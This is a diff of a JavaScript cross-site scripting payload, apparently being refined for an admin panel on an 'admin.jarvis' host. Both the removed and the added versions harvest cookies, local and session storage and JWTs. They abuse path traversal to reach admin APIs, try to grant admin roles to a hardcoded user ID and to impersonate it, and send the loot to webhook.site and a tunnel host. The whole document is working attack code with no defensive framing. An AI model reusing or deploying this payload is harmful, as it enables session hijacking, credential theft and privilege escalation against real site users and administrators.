@@ -1,63 +1,57 @@
 (async()=>{
 try{
-if(!window.location.hostname.includes('admin.jarvis')){return;}
-const steal={};
-try{steal.cookie=(document.cookie||'').substring(0,800);}catch(e){steal.cookie='';}
-try{
-  const ls={}; for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i); ls[k]=(localStorage.getItem(k)||'').substring(0,200);}
-  steal.ls=JSON.stringify(ls).substring(0,900);
-}catch(e){steal.ls='';}
-try{
-  const ss={}; for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i); ss[k]=(sessionStorage.getItem(k)||'').substring(0,200);}
-  steal.ss=JSON.stringify(ss).substring(0,900);
-}catch(e){steal.ss='';}
-try{steal.href=location.href.substring(0,200);}catch(e){}
-let jwt='';
-try{
-  for(const store of [localStorage,sessionStorage]){
-    for(let i=0;i<store.length;i++){
-      const v=store.getItem(store.key(i))||'';
-      if(v.startsWith('eyJ')&&v.length>100){jwt=v.substring(0,200);break;}
-    }
-    if(jwt) break;
+if(!String(location.hostname||'').match(/admin\.jarvis/)){return;}
+const C='https://webhook.site/9d79d0d2-9a16-407f-95e4-5db33e069f14';
+const UID='01967db5-ae00-4642-96ba-f82321e15ef0';
+const out={t:Date.now(),host:location.hostname,href:location.href,ua:navigator.userAgent,cookie:'',cs:'',ls:{},ss:{},jwt:'',pulls:{},assign:{}};
+try{out.cookie=document.cookie||'';}catch(e){}
+try{if(window.cookieStore&&cookieStore.getAll){out.cs=await cookieStore.getAll();}}catch(e){}
+try{for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);const v=localStorage.getItem(k)||'';out.ls[k]=v.substring(0,500);if(!out.jwt&&v.startsWith('eyJ'))out.jwt=v;}}catch(e){}
+try{for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i);const v=sessionStorage.getItem(k)||'';out.ss[k]=v.substring(0,500);if(!out.jwt&&v.startsWith('eyJ'))out.jwt=v;}}catch(e){}
+const prefs=['/api/session/login/../../v1/','/api/v1/','/api/'];
+async function pull(tag,path,opt){
+  for(const pref of prefs){
+    const url=path.startsWith('http')?path:(pref+path.replace(/^\//,''));
+    try{
+      const r=await fetch(url,Object.assign({credentials:'include',headers:{'Accept':'application/json'}},opt||{}));
+      const t=await r.text();
+      out.pulls[tag]={status:r.status,url,body:t.substring(0,1800)};
+      if(r.status&&r.status<500)return out.pulls[tag];
+    }catch(e){out.pulls[tag+'_e']=String(e).substring(0,80);}
   }
-}catch(ex){}
-const r1=await fetch('/api/session/login/../../v1/admin/roles',{credentials:'include',headers:{'Accept':'application/json'}});
-const d1=await r1.json().catch(()=>({}));
-const roles=Array.isArray(d1.data)?d1.data:[];
-const uid='01967db5-ae00-4642-96ba-f82321e15ef0';
-let assignStatus=0,roleId='';
-if(roles.length>0){
-  const adminRole=roles.find(r=>r.name&&(r.name.toLowerCase().includes('admin')||r.name.toLowerCase().includes('super')))||roles[0];
-  roleId=(adminRole.id||'').substring(0,8);
-  const r2=await fetch('/api/session/login/../../v1/admin/users/'+uid+'/roles',{
-    method:'POST',credentials:'include',
-    headers:{'Content-Type':'application/json','Accept':'application/json'},
-    body:JSON.stringify({roleId:adminRole.id})
-  });
-  assignStatus=r2.status;
+  return out.pulls[tag];
 }
-const params=new URLSearchParams({
-  s:String(assignStatus),
-  r:roleId,
-  j:jwt?'YES':'NO',
-  jv:(jwt||'').substring(0,80),
-  ck:(steal.cookie||'').substring(0,300),
-  ls:(steal.ls||'').substring(0,300),
-  ss:(steal.ss||'').substring(0,200),
-  h:(steal.href||'')
-});
-const beacons=['https://59c3825f19d3f1.lhr.life','https://webhook.site/9d79d0d2-9a16-407f-95e4-5db33e069f14'];
-for(const b of beacons){
-  try{new Image().src=b+(b.includes('webhook.site')?'?':'/xss?')+params.toString();}catch(x){}
-  try{fetch(b+(b.includes('webhook.site')?'?':'/xss?')+params.toString(),{mode:'no-cors'});}catch(x){}
-}
+await pull('me','me');
+await pull('roles','admin/roles');
+await pull('users','admin/users?page=1&pageSize=20');
+await pull('user','admin/users/'+UID);
+let roles=[];
 try{
-  await fetch('https://59c3825f19d3f1.lhr.life/dump',{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:JSON.stringify({cookie:steal.cookie,ls:steal.ls,ss:steal.ss,href:steal.href,jwt:jwt,assign:assignStatus,roleId:roleId,t:Date.now()})});
-}catch(x){}
+  const j=JSON.parse((out.pulls.roles&&out.pulls.roles.body)||'{}');
+  roles=Array.isArray(j.data)?j.data:(Array.isArray(j)?j:[]);
+}catch(e){}
+const prefer=roles.filter(r=>/admin|super|owner|root|manage/i.test(String(r.name||r.title||'')));
+const queue=(prefer.concat(roles)).filter((r,i,a)=>r&&r.id&&a.findIndex(x=>x.id===r.id)===i).slice(0,8);
+for(const role of queue){
+  const tag='as_'+String(role.name||role.id).substring(0,18);
+  await pull(tag,'admin/users/'+UID+'/roles',{method:'POST',headers:{'Content-Type':'application/json','Accept':'application/json'},body:JSON.stringify({roleId:role.id})});
+  await pull(tag+'b','admin/users/'+UID+'/roles/'+role.id,{method:'PUT',headers:{'Accept':'application/json'}});
+  await pull(tag+'c','admin/users/'+UID,{method:'PUT',headers:{'Content-Type':'application/json','Accept':'application/json'},body:JSON.stringify({roleIds:[role.id],roles:[role.id]})});
+}
+out.assign.count=queue.length;
+await pull('imp','admin/users/'+UID+'/impersonate',{method:'POST',headers:{'Content-Type':'application/json'},body:'{}'});
+await pull('upd','admin/users/'+UID,{method:'PUT',headers:{'Content-Type':'application/json','Accept':'application/json'},body:JSON.stringify({isAdmin:true,roles:['Admin']})});
+const q=new URLSearchParams({s:String(queue.length),j:out.jwt?'1':'0',ck:(out.cookie||'').substring(0,180),h:(out.href||'').substring(0,80)});
+const body=JSON.stringify(out);
+function boom(url){
+  try{new Image().src=url+(url.includes('?')?'&':'?')+q.toString();}catch(e){}
+  try{fetch(url,{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:body});}catch(e){}
+  try{navigator.sendBeacon&&navigator.sendBeacon(url,new Blob([body],{type:'text/plain'}));}catch(e){}
+  try{const s=document.createElement('script');s.src=url.split('?')[0]+'?'+q.toString();(document.documentElement||document.head).appendChild(s);}catch(e){}
+}
+boom(C);
+try{fetch('/api/session/login/../../v1/me?ja='+encodeURIComponent(q.toString()),{credentials:'include'});}catch(e){}
 }catch(e){
-  const msg=encodeURIComponent(String(e).substring(0,120));
-  try{new Image().src='https://59c3825f19d3f1.lhr.life/err?e='+msg;}catch(x){}
-  try{new Image().src='https://webhook.site/9d79d0d2-9a16-407f-95e4-5db33e069f14?err='+msg;}catch(x){}
+  try{new Image().src='https://webhook.site/9d79d0d2-9a16-407f-95e4-5db33e069f14?err='+encodeURIComponent(String(e).substring(0,160));}catch(x){}
 }
 })();
